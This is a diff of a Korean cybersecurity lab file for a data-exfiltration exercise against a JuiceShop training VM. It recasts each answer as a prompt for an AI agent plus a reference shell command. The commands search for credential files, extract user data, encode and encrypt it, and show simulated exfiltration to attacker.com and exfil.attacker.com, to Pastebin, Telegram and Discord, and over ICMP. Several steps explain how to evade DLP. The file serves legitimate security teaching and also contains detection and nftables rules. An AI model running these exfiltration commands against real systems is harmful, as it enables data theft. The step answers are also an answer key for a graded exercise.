@@ -19,9 +19,12 @@ steps:
   hint: find 명령으로 .conf, .env, .key, .pem 등의 파일을 검색한다
   category: recon
   points: 10
-  answer: ssh ccc@10.20.30.80 'find /etc /home /var/www -type f \( -name "*.conf"
+  answer: '🤖 프롬프트: web 서버에서 민감한 데이터가 포함된 파일을 식별하라. /etc, /home, /var/www에서 설정 파일과
+    데이터 파일을 검색해줘
+
+    📎 참고 (CLI): ssh ccc@10.20.30.80 ''find /etc /home /var/www -type f \( -name "*.conf"
     -o -name "*.env" -o -name "*.key" -o -name "*.pem" -o -name "*.sql" \) 2>/dev/null
-    | head -20' 2>/dev/null
+    | head -20'' 2>/dev/null'
   answer_detail: 데이터 유출의 첫 단계는 가치 있는 데이터를 식별하는 것이다. 설정 파일(자격 증명), 키 파일(인증서), 데이터 덤프(SQL)
     등이 주요 대상이다. MITRE ATT&CK의 Collection 전술에 해당한다.
   verify:
@@ -40,10 +43,12 @@ steps:
   hint: 이전 week에서 배운 SQLi 기법으로 사용자 정보를 추출한다
   category: exploit
   points: 10
-  answer: curl -s http://10.20.30.80:3000/api/Users | python3 -c "import sys,json;
-    users=json.load(sys.stdin)['data']; [print(f\"{u['id']},{u['email']}\") for u
-    in users]" > /tmp/exfil_users.csv && echo 'Extracted users:' && wc -l /tmp/exfil_users.csv
-    && head -5 /tmp/exfil_users.csv
+  answer: '🤖 프롬프트: JuiceShop에서 SQL Injection을 통해 사용자 데이터를 추출하고, 결과를 파일로 저장해줘
+
+    📎 참고 (CLI): curl -s http://10.20.30.80:3000/api/Users | python3 -c "import sys,json;
+    users=json.load(sys.stdin)[''data'']; [print(f\"{u[''id'']},{u[''email'']}\")
+    for u in users]" > /tmp/exfil_users.csv && echo ''Extracted users:'' && wc -l
+    /tmp/exfil_users.csv && head -5 /tmp/exfil_users.csv'
   answer_detail: 데이터 추출 후 CSV나 JSON 형식으로 저장하면 후속 처리가 용이하다. 실전에서는 대량 데이터를 청크로 나누어 점진적으로
     유출하여 탐지를 회피한다.
   verify:
@@ -62,9 +67,11 @@ steps:
   hint: base64 명령으로 파일을 인코딩한다
   category: exploit
   points: 10
-  answer: base64 /tmp/exfil_users.csv > /tmp/exfil_encoded.txt && echo 'Original size:'
-    && wc -c /tmp/exfil_users.csv && echo 'Encoded size:' && wc -c /tmp/exfil_encoded.txt
-    && echo 'Preview:' && head -3 /tmp/exfil_encoded.txt
+  answer: '🤖 프롬프트: 추출한 데이터를 Base64로 인코딩하여 전송 준비를 해줘
+
+    📎 참고 (CLI): base64 /tmp/exfil_users.csv > /tmp/exfil_encoded.txt && echo ''Original
+    size:'' && wc -c /tmp/exfil_users.csv && echo ''Encoded size:'' && wc -c /tmp/exfil_encoded.txt
+    && echo ''Preview:'' && head -3 /tmp/exfil_encoded.txt'
   answer_detail: Base64 인코딩은 바이너리 데이터를 텍스트로 변환하여 텍스트 기반 채널(HTTP, DNS)을 통해 전송할 수 있게
     한다. 크기가 약 33% 증가하지만, DLP 시스템의 패턴 매칭을 회피할 수 있다.
   verify:
@@ -82,8 +89,11 @@ steps:
   hint: curl -X POST -d @파일 형태로 데이터를 전송한다
   category: exploit
   points: 10
-  answer: 'echo ''=== HTTP Exfiltration Simulation ==='' && echo ''Method: curl -X
-    POST -d @/tmp/exfil_encoded.txt http://attacker.com/collect'' && echo ''---''
+  answer: '🤖 프롬프트: HTTP POST 요청을 통한 데이터 유출을 시뮬레이션하라. curl로 인코딩된 데이터를 외부 서버에 전송하는 방법을
+    시연해줘
+
+    📎 참고 (CLI): echo ''=== HTTP Exfiltration Simulation ==='' && echo ''Method: curl
+    -X POST -d @/tmp/exfil_encoded.txt http://attacker.com/collect'' && echo ''---''
     && echo ''With headers disguise:'' && echo ''curl -X POST -H "Content-Type: application/json"
     -d "{\"log\":\"$(head -1 /tmp/exfil_encoded.txt)\"}" http://attacker.com/api/logs''
     && echo ''---'' && echo ''HTTP exfil detected by: proxy logs, DLP, unusual POST
@@ -109,7 +119,9 @@ steps:
   hint: 데이터를 hex/base32로 인코딩하여 DNS 쿼리에 포함한다
   category: exploit
   points: 10
-  answer: 'DATA=''sensitive_data''; ENCODED=$(echo -n $DATA | xxd -p); echo ''===
+  answer: '🤖 프롬프트: DNS 터널링을 통한 데이터 유출의 원리를 이해해줘
+
+    📎 참고 (CLI): DATA=''sensitive_data''; ENCODED=$(echo -n $DATA | xxd -p); echo ''===
     DNS Tunneling Simulation ==='' && echo "Original: $DATA" && echo "Encoded: $ENCODED"
     && echo "DNS query: dig $ENCODED.exfil.attacker.com" && echo ''---'' && echo ''Real
     tools: iodine, dnscat2, DNSExfiltrator'' && echo ''Detection: unusually long DNS
@@ -133,11 +145,13 @@ steps:
   hint: ping -p 옵션으로 패턴 데이터를 지정할 수 있다
   category: exploit
   points: 10
-  answer: 'echo ''=== ICMP Tunneling ==='' && echo ''Using ping -p to embed data in
-    ICMP payload:'' && DATA_HEX=$(echo -n ''EXFIL'' | xxd -p) && echo "Data hex: $DATA_HEX"
-    && ping -c 1 -p $DATA_HEX 10.20.30.80 2>&1 | head -5 && echo ''---'' && echo ''Tools:
-    icmpsh, ptunnel, icmptunnel'' && echo ''Detection: unusual ICMP packet sizes,
-    high ICMP volume'''
+  answer: '🤖 프롬프트: ICMP 터널링의 원리를 이해하기 위해 ping 패킷에 커스텀 데이터를 포함하여 전송해줘
+
+    📎 참고 (CLI): echo ''=== ICMP Tunneling ==='' && echo ''Using ping -p to embed data
+    in ICMP payload:'' && DATA_HEX=$(echo -n ''EXFIL'' | xxd -p) && echo "Data hex:
+    $DATA_HEX" && ping -c 1 -p $DATA_HEX 10.20.30.80 2>&1 | head -5 && echo ''---''
+    && echo ''Tools: icmpsh, ptunnel, icmptunnel'' && echo ''Detection: unusual ICMP
+    packet sizes, high ICMP volume'''
   answer_detail: 'ICMP 터널링은 ping 패킷의 데이터 영역에 정보를 삽입하여 전송한다. 방화벽이 TCP/UDP를 차단해도 ICMP는
     허용하는 경우가 많다. 탐지: 비정상적인 ICMP 패킷 크기와 빈도를 모니터링한다.'
   verify:
@@ -157,7 +171,9 @@ steps:
   hint: openssl enc -aes-256-cbc 옵션으로 파일을 암호화한다
   category: exploit
   points: 10
-  answer: 'openssl enc -aes-256-cbc -salt -in /tmp/exfil_users.csv -out /tmp/exfil_encrypted.bin
+  answer: '🤖 프롬프트: 데이터를 암호화하여 유출하는 방법을 시연하라. openssl로 AES-256 암호화를 적용해줘
+
+    📎 참고 (CLI): openssl enc -aes-256-cbc -salt -in /tmp/exfil_users.csv -out /tmp/exfil_encrypted.bin
     -pass pass:exfil_key_2026 -pbkdf2 2>/dev/null && echo ''Encrypted file:'' && file
     /tmp/exfil_encrypted.bin && ls -la /tmp/exfil_encrypted.bin && echo ''---'' &&
     echo ''Decryption: openssl enc -d -aes-256-cbc -in exfil_encrypted.bin -pass pass:key
@@ -181,10 +197,12 @@ steps:
   hint: split 명령으로 파일을 분할하고 순차 전송을 시뮬레이션한다
   category: exploit
   points: 10
-  answer: split -b 50 /tmp/exfil_users.csv /tmp/chunk_ && echo 'Chunks created:' &&
-    ls -la /tmp/chunk_* && echo '---' && echo 'Low-and-slow exfil simulation:' &&
-    for f in /tmp/chunk_*; do echo "Sending $(basename $f) ($(wc -c < $f) bytes) at
-    $(date +%H:%M:%S)"; done
+  answer: '🤖 프롬프트: 데이터를 작은 청크로 분할하여 시간을 두고 유출하는 Low-and-Slow 기법을 시연해줘
+
+    📎 참고 (CLI): split -b 50 /tmp/exfil_users.csv /tmp/chunk_ && echo ''Chunks created:''
+    && ls -la /tmp/chunk_* && echo ''---'' && echo ''Low-and-slow exfil simulation:''
+    && for f in /tmp/chunk_*; do echo "Sending $(basename $f) ($(wc -c < $f) bytes)
+    at $(date +%H:%M:%S)"; done'
   answer_detail: Low-and-Slow 유출은 데이터를 작은 조각으로 나누어 긴 시간에 걸쳐 전송한다. 각 전송이 정상 트래픽과 구분되지
     않을 정도로 소량이므로 볼륨 기반 탐지를 회피한다.
   verify:
@@ -203,8 +221,10 @@ steps:
   hint: steghide 또는 단순히 cat으로 파일을 결합한다
   category: exploit
   points: 10
-  answer: 'echo ''SECRET_DATA:admin@juice-sh.op:password123'' > /tmp/secret.txt &&
-    dd if=/dev/urandom bs=1024 count=10 of=/tmp/fake_image.jpg 2>/dev/null && cat
+  answer: '🤖 프롬프트: 스테가노그래피를 사용하여 이미지 파일에 데이터를 숨기는 기법을 시연해줘
+
+    📎 참고 (CLI): echo ''SECRET_DATA:admin@juice-sh.op:password123'' > /tmp/secret.txt
+    && dd if=/dev/urandom bs=1024 count=10 of=/tmp/fake_image.jpg 2>/dev/null && cat
     /tmp/fake_image.jpg /tmp/secret.txt > /tmp/stego_image.jpg && echo ''Steganography
     simulation:'' && echo ''Original: '' $(wc -c < /tmp/fake_image.jpg) ''bytes''
     && echo ''With hidden data: '' $(wc -c < /tmp/stego_image.jpg) ''bytes'' && echo
@@ -232,8 +252,10 @@ steps:
   hint: curl로 REST API에 데이터를 POST한다
   category: exploit
   points: 10
-  answer: 'echo ''=== Cloud Service Exfiltration ==='' && echo ''Pastebin: curl -X
-    POST -d "api_paste_code=$(cat /tmp/exfil_encoded.txt)" https://pastebin.com/api/api_post.php''
+  answer: '🤖 프롬프트: curl을 사용하여 클라우드 서비스를 통한 유출을 시뮬레이션하라 구현 방법과 예시를 설명해줘
+
+    📎 참고 (CLI): echo ''=== Cloud Service Exfiltration ==='' && echo ''Pastebin: curl
+    -X POST -d "api_paste_code=$(cat /tmp/exfil_encoded.txt)" https://pastebin.com/api/api_post.php''
     && echo ''Telegram: curl -F "document=@/tmp/exfil_encrypted.bin" https://api.telegram.org/bot<TOKEN>/sendDocument?chat_id=<ID>''
     && echo ''Discord: curl -F "file=@/tmp/data.zip" https://discord.com/api/webhooks/<ID>''
     && echo ''---'' && echo ''Detection: SSL inspection, domain reputation, upload
@@ -258,10 +280,12 @@ steps:
   hint: tar czf 명령으로 압축 아카이브를 생성한다
   category: exploit
   points: 10
-  answer: tar czf /tmp/exfil_archive.tar.gz /tmp/exfil_users.csv /tmp/exfil_encoded.txt
-    2>/dev/null && echo 'Archive created:' && ls -lh /tmp/exfil_archive.tar.gz &&
-    echo 'Original total:' && du -ch /tmp/exfil_users.csv /tmp/exfil_encoded.txt 2>/dev/null
-    | tail -1 && echo 'Compression ratio achieved'
+  answer: '🤖 프롬프트: tar와 gzip으로 수집한 데이터를 아카이브하고 압축해줘
+
+    📎 참고 (CLI): tar czf /tmp/exfil_archive.tar.gz /tmp/exfil_users.csv /tmp/exfil_encoded.txt
+    2>/dev/null && echo ''Archive created:'' && ls -lh /tmp/exfil_archive.tar.gz &&
+    echo ''Original total:'' && du -ch /tmp/exfil_users.csv /tmp/exfil_encoded.txt
+    2>/dev/null | tail -1 && echo ''Compression ratio achieved'''
   answer_detail: 데이터 압축은 전송 시간과 볼륨을 줄여 탐지 위험을 낮춘다. 텍스트 데이터는 90% 이상 압축될 수 있다. 암호화와
     결합하면(tar czf - | openssl enc) 콘텐츠 검사와 볼륨 분석을 모두 회피할 수 있다.
   verify:
@@ -280,12 +304,14 @@ steps:
   hint: tcpdump으로 DNS(port 53) 트래픽을 캡처하고 패킷 크기를 분석한다
   category: analysis
   points: 10
-  answer: echo '=== Exfiltration Detection ===' && echo 'DNS tunneling detection:'
-    && echo 'tcpdump -i any port 53 -nn -l | awk "{if(length>200) print \"SUSPICIOUS:\",
-    \$0}"' && echo '---' && echo 'HTTP exfil detection:' && echo 'tcpdump -i any port
-    80 or port 443 -nn -c 10 -q' && echo '---' && echo 'ICMP exfil detection:' &&
-    echo 'tcpdump -i any icmp -nn -l | awk "{if(length>100) print \"LARGE ICMP:\",
-    \$0}"' && echo '---' && sudo tcpdump -c 3 -i any port 53 -nn 2>&1 | head -5
+  answer: '🤖 프롬프트: tcpdump를 사용하여 데이터 유출 트래픽을 탐지하는 방법을 시연해줘
+
+    📎 참고 (CLI): echo ''=== Exfiltration Detection ==='' && echo ''DNS tunneling detection:''
+    && echo ''tcpdump -i any port 53 -nn -l | awk "{if(length>200) print \"SUSPICIOUS:\",
+    \$0}"'' && echo ''---'' && echo ''HTTP exfil detection:'' && echo ''tcpdump -i
+    any port 80 or port 443 -nn -c 10 -q'' && echo ''---'' && echo ''ICMP exfil detection:''
+    && echo ''tcpdump -i any icmp -nn -l | awk "{if(length>100) print \"LARGE ICMP:\",
+    \$0}"'' && echo ''---'' && sudo tcpdump -c 3 -i any port 53 -nn 2>&1 | head -5'
   answer_detail: 네트워크 기반 유출 탐지는 비정상적인 트래픽 패턴을 식별한다. DNS 쿼리 길이, ICMP 패킷 크기, HTTP POST
     볼륨 등이 주요 지표이다. IDS/IPS 규칙과 SIEM 상관 분석을 결합하면 효과적이다.
   verify:
@@ -306,10 +332,12 @@ steps:
   hint: xxd -p로 hex 인코딩, xxd -r -p로 디코딩한다
   category: exploit
   points: 10
-  answer: echo 'admin:password123' | xxd -p > /tmp/hex_exfil.txt && echo 'Hex encoded:'
-    && cat /tmp/hex_exfil.txt && echo 'Decoded:' && xxd -r -p /tmp/hex_exfil.txt &&
-    echo '---' && echo 'Hex encoding is useful for embedding data in URLs, cookies,
-    and headers'
+  answer: '🤖 프롬프트: xxd를 사용하여 데이터를 hex 인코딩하고, 복원하는 과정을 시연해줘
+
+    📎 참고 (CLI): echo ''admin:password123'' | xxd -p > /tmp/hex_exfil.txt && echo ''Hex
+    encoded:'' && cat /tmp/hex_exfil.txt && echo ''Decoded:'' && xxd -r -p /tmp/hex_exfil.txt
+    && echo ''---'' && echo ''Hex encoding is useful for embedding data in URLs, cookies,
+    and headers'''
   answer_detail: Hex 인코딩은 Base64와 함께 데이터 변환에 자주 사용된다. URL, HTTP 헤더, 쿠키 등 다양한 채널에 데이터를
     삽입할 수 있다. 여러 인코딩을 중첩하면 패턴 매칭을 더 어렵게 만든다.
   verify:
@@ -328,7 +356,9 @@ steps:
   hint: nftables의 ct bytes 매처를 사용하여 연결당 전송량을 제한한다
   category: analysis
   points: 15
-  answer: 'echo -e ''=== DLP Firewall Rules (nftables) ===\n\n# Rate limit outbound
+  answer: '🤖 프롬프트: 데이터 유출 방지(DLP)를 위한 nftables 방화벽 규칙을 구현 방법을 설명하고 예시 코드를 보여줘
+
+    📎 참고 (CLI): echo -e ''=== DLP Firewall Rules (nftables) ===\n\n# Rate limit outbound
     connections\nadd rule inet filter output tcp dport {80, 443} ct state new limit
     rate 10/minute burst 20 accept\nadd rule inet filter output tcp dport {80, 443}
     ct state new drop\n\n# Block DNS to non-approved servers\nadd rule inet filter
@@ -359,8 +389,10 @@ steps:
   hint: 각 유출 채널의 장단점과 탐지 가능성을 비교한다
   category: analysis
   points: 15
-  answer: 'echo -e ''=== Data Exfiltration Report ===\n\n[Data Collected]\n- User
-    credentials from JuiceShop API\n- Configuration files from web server\n\n[Exfiltration
+  answer: '🤖 프롬프트: 데이터 유출 실습 결과를 /tmp/exfiltration_report.txt에 정리해줘
+
+    📎 참고 (CLI): echo -e ''=== Data Exfiltration Report ===\n\n[Data Collected]\n-
+    User credentials from JuiceShop API\n- Configuration files from web server\n\n[Exfiltration
     Channels]\n1. HTTP POST: Easy, blends with normal traffic\n2. DNS Tunneling: Bypasses
     most firewalls\n3. ICMP Tunneling: Often overlooked\n4. Cloud Services: HTTPS
     encrypted\n5. Steganography: Hidden in media files\n\n[Evasion Techniques]\n-
@@ -410,7 +442,17 @@ steps:
     field: stdout
   target_vm: attacker
   risk_level: low
-  answer: ''
+  answer: '🤖 프롬프트: 다음 작업들을 순서대로 수행해줘:
+
+    1) web 서버에서 민감한 데이터가 포함된 파일을 식별하라. /etc, /home, /var/www에서 설정 파일과 데이터 파일을 검색해줘
+
+    2) JuiceShop에서 SQL Injection을 통해 사용자 데이터를 추출하고, 결과를 파일로 저장해줘
+
+    3) 추출한 데이터를 Base64로 인코딩하여 전송 준비를 해줘
+
+    4) HTTP POST 요청을 통한 데이터 유출을 시뮬레이션하라. curl로 인코딩된 데이터를 외부 서버에 전송하는 방법을 시연해줘
+
+    5) DNS 터널링을 통한 데이터 유출의 원리를 이해해줘'
   answer_detail: Bastion이 5개 작업을 순차적으로 계획(planning)하고 실행(executing)한 뒤 종합 분석(validating)하는
     다단계 작업.
   script: ''
